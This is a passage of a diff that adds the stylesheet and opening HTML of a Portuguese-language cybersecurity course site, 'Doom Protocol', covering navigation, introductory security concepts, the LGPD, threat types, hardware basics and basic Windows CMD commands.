+.quiz-submit-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+.quiz-result {
+  margin-top: 16px;
+  padding: 14px 18px;
+  border-radius: 2px 10px 2px 10px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.85rem;
+  display: none;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.quiz-result.shown { display: flex; }
+
+.quiz-result.pass { background: rgba(46, 204, 64, 0.1); border: 1px solid var(--doom-highlight); color: var(--doom-highlight); }
+.quiz-result.fail { background: rgba(139, 0, 0, 0.1); border: 1px solid var(--doom-danger); color: #ff8888; }
+
+.quiz-retry-btn {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.72rem;
+  padding: 6px 12px;
+  border: 1px solid currentColor;
+  background: transparent;
+  color: inherit;
+  border-radius: 2px 6px 2px 6px;
+  cursor: pointer;
+}
+
+/* Rank / clearance level badge */
+.status-badge.rank-updated { animation: rankPulse 0.6s ease; }
+
+@keyframes rankPulse {
+  0% { box-shadow: 0 0 0 0 rgba(46, 204, 64, 0.7); }
+  100% { box-shadow: 0 0 0 14px rgba(46, 204, 64, 0); }
+}
+
+.clearance-panel {
+  padding: 4px 24px 16px;
+  border-bottom: 1px solid rgba(74, 85, 104, 0.3);
+  margin-bottom: 8px;
+}
+
+.clearance-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.62rem;
+  color: var(--doom-text-secondary);
+  text-transform: uppercase;
+  letter-spacing: 0.1em;
+  margin-bottom: 4px;
+}
+
+.clearance-rank {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: var(--doom-gold);
+  letter-spacing: 0.05em;
+  transition: color 0.4s ease;
+}
+
+/* Reset progress button */
+.reset-progress-wrap {
+  padding: 14px 24px 4px;
+}
+
+.reset-progress-btn {
+  width: 100%;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.65rem;
+  padding: 8px 10px;
+  border: 1px solid rgba(139, 0, 0, 0.4);
+  background: transparent;
+  color: #c98888;
+  border-radius: 2px 8px 2px 8px;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  transition: all 0.2s ease;
+}
+
+.reset-progress-btn:hover {
+  border-color: var(--doom-danger);
+  background: rgba(139, 0, 0, 0.1);
+  color: #ff8888;
+}
+
+.save-indicator {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6rem;
+  color: var(--doom-text-secondary);
+  text-align: center;
+  margin-top: 8px;
+  opacity: 0;
+  transition: opacity 0.4s ease;
+}
+
+.save-indicator.shown { opacity: 1; }
+
+/* Celebration banner (100% concluido) */
+.celebration-banner {
+  position: fixed;
+  top: 80px;
+  left: 50%;
+  transform: translateX(-50%) translateY(-20px);
+  background: var(--doom-bg-secondary);
+  border: 1px solid var(--doom-gold);
+  box-shadow: 0 0 40px rgba(184, 134, 11, 0.35), 0 20px 50px rgba(0,0,0,0.5);
+  border-radius: 2px 16px 2px 16px;
+  padding: 18px 24px;
+  z-index: 3000;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  opacity: 0;
+  pointer-events: none;
+  transition: all 0.5s cubic-bezier(.21,.9,.32,1);
+  max-width: 90vw;
+}
+
+.celebration-banner.shown {
+  opacity: 1;
+  transform: translateX(-50%) translateY(0);
+  pointer-events: auto;
+}
+
+.celebration-banner-icon { font-size: 1.8rem; }
+.celebration-banner-text { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--doom-text-primary); }
+.celebration-banner-text strong { color: var(--doom-gold); display: block; font-family: 'Orbitron', sans-serif; font-size: 1rem; margin-bottom: 2px; }
+
+.celebration-close {
+  background: transparent;
+  border: none;
+  color: var(--doom-text-secondary);
+  cursor: pointer;
+  font-size: 1rem;
+  padding: 4px;
+}
+
+/* Back to top */
+.back-to-top {
+  position: fixed;
+  bottom: 28px;
+  right: 28px;
+  width: 44px;
+  height: 44px;
+  border-radius: 2px 12px 2px 12px;
+  background: rgba(13, 31, 13, 0.95);
+  border: 1px solid var(--doom-border);
+  color: var(--doom-highlight);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  opacity: 0;
+  pointer-events: none;
+  transform: translateY(10px);
+  transition: all 0.3s ease;
+  z-index: 500;
+}
+
+.back-to-top.visible {
+  opacity: 1;
+  pointer-events: auto;
+  transform: translateY(0);
+}
+
+.back-to-top:hover {
+  border-color: var(--doom-highlight);
+  box-shadow: 0 0 16px rgba(46, 204, 64, 0.3);
+}
+
+.back-to-top svg { width: 18px; height: 18px; }
+
+/* Footer */
+footer {
+  margin-left: 280px;
+  padding: 40px 48px;
+  border-top: 1px solid var(--doom-border);
+  text-align: center;
+  color: var(--doom-metal);
+  font-size: 0.8rem;
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .sidebar { width: 240px; }
+  main, footer { margin-left: 240px; max-width: calc(100vw - 240px); }
+}
+
+@media (max-width: 768px) {
+  .menu-toggle { display: flex; }
+  .sidebar {
+    transform: translateX(-100%);
+    width: 280px;
+  }
+  .sidebar.open { transform: translateX(0); }
+  .sidebar-overlay.open { display: block; }
+  main, footer { margin-left: 0; max-width: 100%; padding: 24px; }
+  header { padding: 0 16px; }
+  .nav-links { display: none; }
+  .hero h1 { font-size: 2rem; }
+  .section-progress { display: none; }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; }
+}
+
+/* Print stylesheet */
+@media print {
+  body::before, body::after { display: none !important; }
+  header, .sidebar, .sidebar-overlay, .back-to-top, .search-overlay,
+  .celebration-banner, .menu-toggle, .copy-btn, .mark-complete-btn,
+  .section-progress, .quiz-card, .practice-link { display: none !important; }
+  main { margin-left: 0 !important; max-width: 100% !important; padding: 0 !important; }
+  footer { margin-left: 0 !important; }
+  body { background: #fff !important; color: #111 !important; }
+  .card, .table-wrap, pre { break-inside: avoid; border: 1px solid #ccc !important; box-shadow: none !important; }
+  .card p, .card li, td, .hero-desc { color: #222 !important; }
+  .hero h1, .section-header h2, .card h3 { color: #000 !important; text-shadow: none !important; }
+  a { color: #000 !important; text-decoration: underline; }
+  pre code { color: #111 !important; }
+  .reveal { opacity: 1 !important; transform: none !important; }
+}
+</style>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='47' fill='%23000'/%3E%3Ccircle cx='50' cy='50' r='42' fill='none' stroke='%233a7d3a' stroke-width='6'/%3E%3Ccircle cx='50' cy='50' r='35' fill='none' stroke='%237a1f2d' stroke-width='6'/%3E%3Ccircle cx='50' cy='50' r='30' fill='%23050805'/%3E%3Cpath d='M50 21 L71 30.5 V52 C71 65 62 74 50 79 C38 74 29 65 29 52 V30.5 Z' fill='none' stroke='%232ecc40' stroke-width='2.5'/%3E%3Ccircle cx='50' cy='45' r='5.5' fill='none' stroke='%232ecc40' stroke-width='2.2'/%3E%3Cpath d='M45.5,49.5 L54.5,49.5 L51.5,62 L48.5,62 Z' fill='%232ecc40'/%3E%3C/svg%3E">
+<meta property="og:type" content="website">
+<meta property="og:title" content="DOOM PROTOCOL | Curso de Cibersegurança">
+<meta property="og:description" content="Sistema de treinamento de cibersegurança operacional — 17 módulos, do zero ao profissional, com teoria, código e projetos práticos.">
+<meta property="og:site_name" content="Doom Protocol">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DOOM PROTOCOL | Curso de Cibersegurança">
+<meta name="twitter:description" content="Sistema de treinamento de cibersegurança operacional — 17 módulos, do zero ao profissional.">
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <button class="menu-toggle" id="menuToggle" aria-label="Abrir menu de módulos" aria-expanded="false">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <div class="logo">
+      <svg class="logo-emblem" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Emblema Doom Protocol">
+        <circle cx="50" cy="50" r="47" fill="#000000" stroke="#000000" stroke-width="1.5"/>
+        <circle cx="50" cy="50" r="42" fill="none" stroke="#3a7d3a" stroke-width="6"/>
+        <circle cx="50" cy="50" r="35" fill="none" stroke="#7a1f2d" stroke-width="6"/>
+        <circle cx="50" cy="50" r="30" fill="#050805"/>
+        <path d="M50 21 L71 30.5 V52 C71 65 62 74 50 79 C38 74 29 65 29 52 V30.5 Z" fill="none" stroke="#2ecc40" stroke-width="2.5"/>
+        <circle cx="50" cy="45" r="5.5" fill="none" stroke="#2ecc40" stroke-width="2.2"/>
+        <path d="M45.5,49.5 L54.5,49.5 L51.5,62 L48.5,62 Z" fill="#2ecc40"/>
+        <circle cx="50" cy="21" r="2" fill="#b8860b"/>
+        <circle cx="50" cy="79" r="2" fill="#b8860b"/>
+      </svg>
+      DOOM PROTOCOL <span>| Sistema de Treinamento de Cibersegurança</span>
+    </div>
+  </div>
+  <ul class="nav-links">
+    <li><a href="#modulos">Protocolos</a></li>
+    <li><a href="#mod16">Arsenal</a></li>
+    <li><a href="#mod17">Trajetória</a></li>
+  </ul>
+  <div class="header-right">
+    <button class="search-trigger" id="searchTrigger" aria-label="Buscar conteúdo (Ctrl+K)">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      <span class="search-trigger-label">Buscar</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+    <div class="status-badge">● SISTEMA SEGURO</div>
+  </div>
+</header>
+
+<div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+<div class="container">
+  <aside class="sidebar" id="sidebar">
+    <div class="clearance-panel">
+      <div class="clearance-label">Nível de Acesso</div>
+      <div class="clearance-rank" id="clearanceRank">RECRUTA</div>
+    </div>
+    <div class="overall-progress">
+      <div class="overall-progress-label">
+        <span>Progresso geral</span>
+        <span id="overallProgressText">0/17</span>
+      </div>
+      <div class="progress-wrap"><div class="progress-fill" id="overallProgressFill" style="width:0%"></div></div>
+    </div>
+    <div class="sidebar-title">Índice de Acesso</div>
+    <ul class="sidebar-nav" id="sidebarNav">
+      <li><a href="#inicio" class="active">Terminal Central</a></li>
+      <li><a href="#mod01"><span class="mod-check" data-mod="01" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 01 como concluído" tabindex="0"></span> Módulo 01 <span class="mod-number">INICIANTE</span></a></li>
+      <li><a href="#mod02"><span class="mod-check" data-mod="02" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 02 como concluído" tabindex="0"></span> Módulo 02 <span class="mod-number">INICIANTE</span></a></li>
+      <li><a href="#mod03"><span class="mod-check" data-mod="03" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 03 como concluído" tabindex="0"></span> Módulo 03 <span class="mod-number">INICIANTE</span></a></li>
+      <li><a href="#mod04"><span class="mod-check" data-mod="04" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 04 como concluído" tabindex="0"></span> Módulo 04 <span class="mod-number">INICIANTE</span></a></li>
+      <li><a href="#mod05"><span class="mod-check" data-mod="05" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 05 como concluído" tabindex="0"></span> Módulo 05 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod06"><span class="mod-check" data-mod="06" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 06 como concluído" tabindex="0"></span> Módulo 06 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod07"><span class="mod-check" data-mod="07" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 07 como concluído" tabindex="0"></span> Módulo 07 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod08"><span class="mod-check" data-mod="08" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 08 como concluído" tabindex="0"></span> Módulo 08 <span class="mod-number">INTERM+</span></a></li>
+      <li><a href="#mod09"><span class="mod-check" data-mod="09" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 09 como concluído" tabindex="0"></span> Módulo 09 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod10"><span class="mod-check" data-mod="10" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 10 como concluído" tabindex="0"></span> Módulo 10 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod11"><span class="mod-check" data-mod="11" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 11 como concluído" tabindex="0"></span> Módulo 11 <span class="mod-number">INTERM</span></a></li>
+      <li><a href="#mod12"><span class="mod-check" data-mod="12" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 12 como concluído" tabindex="0"></span> Módulo 12 <span class="mod-number">INTERM+</span></a></li>
+      <li><a href="#mod13"><span class="mod-check" data-mod="13" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 13 como concluído" tabindex="0"></span> Módulo 13 <span class="mod-number">AVANÇADO</span></a></li>
+      <li><a href="#mod14"><span class="mod-check" data-mod="14" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 14 como concluído" tabindex="0"></span> Módulo 14 <span class="mod-number">AVANÇADO</span></a></li>
+      <li><a href="#mod15"><span class="mod-check" data-mod="15" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 15 como concluído" tabindex="0"></span> Módulo 15 <span class="mod-number">AVANÇADO</span></a></li>
+      <li><a href="#mod16"><span class="mod-check" data-mod="16" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 16 como concluído" tabindex="0"></span> Módulo 16 <span class="mod-number">PROFIS</span></a></li>
+      <li><a href="#mod17"><span class="mod-check" data-mod="17" role="checkbox" aria-checked="false" aria-label="Marcar Módulo 17 como concluído" tabindex="0"></span> Módulo 17 <span class="mod-number">PROFIS</span></a></li>
+    </ul>
+    <div class="reset-progress-wrap">
+      <button class="reset-progress-btn" id="resetProgressBtn" type="button">Resetar progresso</button>
+      <div class="save-indicator" id="saveIndicator">Progresso salvo neste navegador</div>
+    </div>
+  </aside>
+
+  <main>
+    <section class="hero" id="inicio">
+      <svg class="hero-emblem" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Emblema Doom Protocol">
+        <circle cx="50" cy="50" r="47" fill="#000000" stroke="#000000" stroke-width="1.5"/>
+        <circle cx="50" cy="50" r="42" fill="none" stroke="#3a7d3a" stroke-width="6"/>
+        <circle cx="50" cy="50" r="35" fill="none" stroke="#7a1f2d" stroke-width="6"/>
+        <circle cx="50" cy="50" r="30" fill="#050805"/>
+        <path d="M50 21 L71 30.5 V52 C71 65 62 74 50 79 C38 74 29 65 29 52 V30.5 Z" fill="none" stroke="#2ecc40" stroke-width="2.5"/>
+        <circle cx="50" cy="45" r="5.5" fill="none" stroke="#2ecc40" stroke-width="2.2"/>
+        <path d="M45.5,49.5 L54.5,49.5 L51.5,62 L48.5,62 Z" fill="#2ecc40"/>
+        <circle cx="50" cy="21" r="2" fill="#b8860b"/>
+        <circle cx="50" cy="79" r="2" fill="#b8860b"/>
+      </svg>
+      <h1>DOOM PROTOCOL</h1>
+      <p class="hero-sub">Do Zero ao Profissional | Teoria + Código + Projetos</p>
+      <p class="hero-desc">
+        Sistema de treinamento de cibersegurança operacional. Acesso autorizado apenas para operadores qualificados. 
+        17 módulos de protocolo cobrindo desde fundamentos de rede até operações de Red Team avançado.
+      </p>
+      <div class="hero-badges">
+        <span class="badge gold">◈ 17 Módulos</span>
+        <span class="badge">⚡ Teoria + Prática</span>
+        <span class="badge">🛡️ 15 Projetos</span>
+        <span class="badge gold">◈ Certificações</span>
+      </div>
+      <div class="boot-sequence" id="bootSequence" aria-live="polite"></div>
+      <div class="alert" style="max-width:700px;margin:32px auto 0;text-align:left;">
+        <strong>Aviso legal:</strong> todo o conteúdo deste protocolo é destinado a ambientes autorizados, laboratórios próprios e plataformas de prática (CTFs, labs de pentest). Testar sistemas sem autorização explícita é crime previsto na Lei 12.737/2012 e no Marco Civil da Internet.
+      </div>
+    </section>
+
+    <!-- ÍNDICE GERAL -->
+    <section class="section" id="modulos">
+      <div class="section-header">
+        <h2>Índice Geral de Protocolos</h2>
+        <span class="section-tag">Classificado</span>
+      </div>
+      <div class="module-grid">
+        <a class="module-card reveal" href="#mod01" data-mod="01"><span class="module-card-num">01</span><button class="module-card-check" data-mod="01" aria-label="Marcar Módulo 01 como concluído"></button><span class="module-card-title">Fundamentos de Cibersegurança</span><span class="section-tag">Iniciante</span></a>
+        <a class="module-card reveal" href="#mod02" data-mod="02"><span class="module-card-num">02</span><button class="module-card-check" data-mod="02" aria-label="Marcar Módulo 02 como concluído"></button><span class="module-card-title">Hardware e Arquitetura</span><span class="section-tag">Iniciante</span></a>
+        <a class="module-card reveal" href="#mod03" data-mod="03"><span class="module-card-num">03</span><button class="module-card-check" data-mod="03" aria-label="Marcar Módulo 03 como concluído"></button><span class="module-card-title">Sistemas Operacionais</span><span class="section-tag">Iniciante</span></a>
+        <a class="module-card reveal" href="#mod04" data-mod="04"><span class="module-card-num">04</span><button class="module-card-check" data-mod="04" aria-label="Marcar Módulo 04 como concluído"></button><span class="module-card-title">Redes de Computadores</span><span class="section-tag">Iniciante</span></a>
+        <a class="module-card reveal" href="#mod05" data-mod="05"><span class="module-card-num">05</span><button class="module-card-check" data-mod="05" aria-label="Marcar Módulo 05 como concluído"></button><span class="module-card-title">Programação para Segurança</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod06" data-mod="06"><span class="module-card-num">06</span><button class="module-card-check" data-mod="06" aria-label="Marcar Módulo 06 como concluído"></button><span class="module-card-title">Python Completo para Segurança</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod07" data-mod="07"><span class="module-card-num">07</span><button class="module-card-check" data-mod="07" aria-label="Marcar Módulo 07 como concluído"></button><span class="module-card-title">Segurança Web</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod08" data-mod="08"><span class="module-card-num">08</span><button class="module-card-check" data-mod="08" aria-label="Marcar Módulo 08 como concluído"></button><span class="module-card-title">Ethical Hacking e Pentest</span><span class="section-tag danger">Interm → Avançado</span></a>
+        <a class="module-card reveal" href="#mod09" data-mod="09"><span class="module-card-num">09</span><button class="module-card-check" data-mod="09" aria-label="Marcar Módulo 09 como concluído"></button><span class="module-card-title">Linux Avançado para Segurança</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod10" data-mod="10"><span class="module-card-num">10</span><button class="module-card-check" data-mod="10" aria-label="Marcar Módulo 10 como concluído"></button><span class="module-card-title">Programação (Projetos)</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod11" data-mod="11"><span class="module-card-num">11</span><button class="module-card-check" data-mod="11" aria-label="Marcar Módulo 11 como concluído"></button><span class="module-card-title">Banco de Dados e SQL</span><span class="section-tag">Intermediário</span></a>
+        <a class="module-card reveal" href="#mod12" data-mod="12"><span class="module-card-num">12</span><button class="module-card-check" data-mod="12" aria-label="Marcar Módulo 12 como concluído"></button><span class="module-card-title">Criptografia Aplicada</span><span class="section-tag danger">Interm → Avançado</span></a>
+        <a class="module-card reveal" href="#mod13" data-mod="13"><span class="module-card-num">13</span><button class="module-card-check" data-mod="13" aria-label="Marcar Módulo 13 como concluído"></button><span class="module-card-title">Cloud Security</span><span class="section-tag danger">Avançado</span></a>
+        <a class="module-card reveal" href="#mod14" data-mod="14"><span class="module-card-num">14</span><button class="module-card-check" data-mod="14" aria-label="Marcar Módulo 14 como concluído"></button><span class="module-card-title">Blue Team e SOC</span><span class="section-tag danger">Avançado</span></a>
+        <a class="module-card reveal" href="#mod15" data-mod="15"><span class="module-card-num">15</span><button class="module-card-check" data-mod="15" aria-label="Marcar Módulo 15 como concluído"></button><span class="module-card-title">Red Team Avançado</span><span class="section-tag danger">Avançado</span></a>
+        <a class="module-card reveal" href="#mod16" data-mod="16"><span class="module-card-num">16</span><button class="module-card-check" data-mod="16" aria-label="Marcar Módulo 16 como concluído"></button><span class="module-card-title">Projetos Completos</span><span class="section-tag gold">Profissional</span></a>
+        <a class="module-card reveal" href="#mod17" data-mod="17"><span class="module-card-num">17</span><button class="module-card-check" data-mod="17" aria-label="Marcar Módulo 17 como concluído"></button><span class="module-card-title">Roadmap de Carreira</span><span class="section-tag gold">Profissional</span></a>
+      </div>
+    </section>
+
+    <!-- MÓDULO 01 -->
+    <section class="section" id="mod01" data-mod="01">
+      <div class="section-header">
+        <h2>Módulo 01 — Fundamentos de Cibersegurança</h2>
+        <span class="section-tag">Iniciante</span>
+        <span class="est-time">~40 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="01">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>1.1 O que é Cibersegurança?</h3>
+        <p>A Cibersegurança é a área responsável por proteger sistemas, redes, aplicações, bancos de dados, servidores, computadores, smartphones e informações digitais contra acessos não autorizados.</p>
+        <ul class="content-list">
+          <li>Impedir invasões e roubo de informações</li>
+          <li>Prevenir vazamentos de dados</li>
+          <li>Bloquear ataques cibernéticos e fraudes digitais</li>
+          <li>Reduzir perdas financeiras</li>
+        </ul>
+        <div class="alert">IMPORTANTE: Cibersegurança é uma das áreas da Segurança da Informação, que é mais abrangente.</div>
+      </div>
+
+      <div class="card">
+        <h3>1.2 Segurança da Informação vs. Segurança Digital</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Segurança da Informação</th><th>Segurança Digital</th></tr></thead>
+            <tbody>
+              <tr><td>Protege qualquer tipo de informação</td><td>Protege usuários, dispositivos e contas</td></tr>
+              <tr><td>Documentos físicos, digitais, verbais</td><td>Foco na internet e dispositivos conectados</td></tr>
+              <tr><td>Confidencialidade, Integridade, Disponibilidade</td><td>2FA, senhas, antivírus, Wi-Fi seguro</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>1.3 Os 3 Pilares: CIA Triad</h3>
+        <p><strong>Confidencialidade</strong> — Garantir que apenas pessoas autorizadas acessem os dados. Exemplos: CPF, senhas, dados bancários. Mecanismos: Criptografia, controle de acesso, autenticação.</p>
+        <p><strong>Integridade</strong> — Garantir que as informações não foram alteradas, apagadas ou corrompidas. Mecanismos: Hashes (SHA-256), assinaturas digitais, checksums.</p>
+        <p><strong>Disponibilidade</strong> — As informações devem estar acessíveis quando necessário. Mecanismos: Backups, redundância, DDoS protection, load balancing.</p>
+      </div>
+
+      <div class="card">
+        <h3>1.4 LGPD — Lei Geral de Proteção de Dados</h3>
+        <p>Criada para proteger dados pessoais dos cidadãos brasileiros.</p>
+        <ul class="content-list">
+          <li><strong>Direitos do titular:</strong> Saber quais dados são armazenados, solicitar correções ou exclusão, saber como os dados são utilizados, revogar consentimento</li>
+          <li><strong>Dados Sensíveis:</strong> Biometria, saúde, religião, origem racial, dados genéticos, opiniões políticas, vida sexual</li>
+          <li><strong>Bases legais:</strong> Consentimento, execução de contrato, obrigação legal, legítimo interesse, proteção da vida, estudo por órgão de pesquisa</li>
+        </ul>
+      </div>
+
+      <div class="card">
+        <h3>1.5 Tipos de Hackers</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Tipo</th><th>Descrição</th><th>Objetivo</th></tr></thead>
+            <tbody>
+              <tr><td>White Hat</td><td>Hackers éticos, contratados por empresas</td><td>Encontrar e corrigir vulnerabilidades</td></tr>
+              <tr><td>Black Hat</td><td>Criminosos digitais</td><td>Roubo, extorsão, sabotagem</td></tr>
+              <tr><td>Grey Hat</td><td>Atuam sem autorização, mas informam depois</td><td>Expor falhas (limite ético questionável)</td></tr>
+              <tr><td>Script Kiddie</td><td>Usam ferramentas prontas sem entender</td><td>Causar danos por diversão</td></tr>
+              <tr><td>Hacktivist</td><td>Ativistas digitais</td><td>Protesto político/ideológico</td></tr>
+              <tr><td>State-sponsored</td><td>Apoiados por governos</td><td>Espionagem, guerra cibernética</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>1.6 Principais Ameaças Digitais</h3>
+        <p><strong>Malware</strong> — Programas maliciosos:</p>
+        <ul class="content-list">
+          <li><strong>Vírus:</strong> Se anexam a arquivos e se replicam</li>
+          <li><strong>Worm:</strong> Se espalham sozinhos pela rede</li>
+          <li><strong>Trojan:</strong> Se disfarçam de software legítimo</li>
+          <li><strong>Spyware:</strong> Espionam atividades do usuário</li>
+          <li><strong>Ransomware:</strong> Criptografam dados e exigem resgate</li>
+          <li><strong>Adware:</strong> Exibem anúncios indesejados</li>
+          <li><strong>Rootkit:</strong> Ocultam presença no sistema</li>
+        </ul>
+        <p><strong>Phishing</strong> — Golpes que roubam informações via e-mails falsos, SMS (smishing), WhatsApp, sites clonados, QR Codes maliciosos.</p>
+        <p><strong>Engenharia Social</strong> — Golpe do falso filho, falso suporte técnico, promoções falsas, QR Codes falsos em estacionamentos.</p>
+        <p><strong>Outras ameaças:</strong> Roubo de identidade, exposição digital, DDoS, Man-in-the-Middle (MitM).</p>
+      </div>
+
+      <div class="card">
+        <h3>1.7 Boas Práticas de Proteção</h3>
+        <p><strong>FAÇA sempre:</strong></p>
+        <ul class="content-list">
+          <li>Use senhas fortes (12+ caracteres, maiúsculas, minúsculas, números, símbolos)</li>
+          <li>Ative 2FA em todas as contas possíveis</li>
+          <li>Mantenha sistemas e aplicativos atualizados</li>
+          <li>Faça backups regulares (Regra 3-2-1)</li>
+          <li>Use Wi-Fi seguro (WPA3/WPA2)</li>
+          <li>Desconfie de links e anexos suspeitos</li>
+        </ul>
+        <p><strong>NUNCA faça:</strong></p>
+        <ul class="content-list">
+          <li>Compartilhe senhas</li>
+          <li>Use Wi-Fi público sem VPN para transações</li>
+          <li>Baixe programas de fontes desconhecidas</li>
+          <li>Exponha informações pessoais desnecessariamente</li>
+          <li>Ignore alertas de segurança do navegador</li>
+        </ul>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="01"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 02 -->
+    <section class="section" id="mod02" data-mod="02">
+      <div class="section-header">
+        <h2>Módulo 02 — Hardware e Arquitetura</h2>
+        <span class="section-tag">Iniciante</span>
+        <span class="est-time">~25 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="02">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>2.1 Componentes Essenciais</h3>
+        <p><strong>CPU (Processador)</strong> — Cérebro do computador. Executa instruções de programas. Arquiteturas: x86, x64, ARM, RISC-V.</p>
+        <p><strong>RAM (Memória Volátil)</strong> — Armazena dados temporariamente. Quanto maior, mais programas rodando simultaneamente. Volátil: perde dados ao desligar.</p>
+        <p><strong>Armazenamento</strong></p>
+        <ul class="content-list">
+          <li><strong>HD (HDD):</strong> Disco magnético, maior capacidade, mais lento</li>
+          <li><strong>SSD:</strong> Chips de memória flash, muito mais rápido</li>
+          <li><strong>NVMe:</strong> SSD conectado via PCIe, velocidade extrema</li>
+        </ul>
+        <p><strong>Placa de Rede (NIC)</strong> — Permite conexão à rede. Endereço MAC único por dispositivo. Ethernet (cabo) vs. Wi-Fi (sem fio).</p>
+        <p><strong>BIOS/UEFI</strong> — Firmware que inicializa o hardware. UEFI é a versão moderna, mais segura (Secure Boot).</p>
+      </div>
+
+      <div class="card">
+        <h3>2.2 Como um Computador Funciona (Resumo)</h3>
+        <pre data-lang="fluxo"><code>Usuario -> Software -> Sistema Operacional -> Drivers -> Hardware</code></pre>
+        <ol class="content-list">
+          <li>Usuario interage com software (aplicativo)</li>
+          <li>Sistema Operacional gerencia recursos</li>
+          <li>Drivers traduzem comandos para hardware</li>
+          <li>Hardware executa as operacoes fisicas</li>
+        </ol>
+      </div>
+    
+      <div class="card quiz-card">
+        <h3>🎯 Checkpoint — Teste seus conhecimentos</h3>
+        <div class="quiz-container" data-quiz-mod="02"></div>
+      </div>
+    </section>
+
+    <!-- MÓDULO 03 -->
+    <section class="section" id="mod03" data-mod="03">
+      <div class="section-header">
+        <h2>Módulo 03 — Sistemas Operacionais</h2>
+        <span class="section-tag">Iniciante</span>
+        <span class="est-time">~50 min</span>
+        <div class="section-progress">
+          <button class="mark-complete-btn" data-mod="03">Marcar concluído</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>3.1 Windows — CMD</h3>
+        <pre data-lang="cmd"><code class="language-dos">:: Listar arquivos
+dir
+
+:: Mudar de diretorio
+cd C:\Users\Aluno\Desktop
+
+:: Criar pasta
+mkdir nova_pasta
+
+:: Ver IP
+ipconfig
+
+:: Testar conectividade
+ping google.com
+
+:: Ver conexoes ativas
+netstat -an
+
+:: Ver usuarios do sistema
+net user
+
+:: Ver processos
+tasklist
+
+:: Matar processo
+taskkill /PID 1234 /F</code></pre>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Comando</th><th>O que faz</th></tr></thead>
+            <tbody>
+              <tr><td><code>dir</code></td><td>Lista arquivos e pastas do diretório atual (equivalente ao <code>ls</code> do Linux)</td></tr>
+              <tr><td><code>cd &lt;caminho&gt;</code></td><td>Muda o diretório de trabalho para o caminho informado</td></tr>
+              <tr><td><code>mkdir &lt;nome&gt;</code></td><td>Cria uma nova pasta com o nome informado</td></tr>
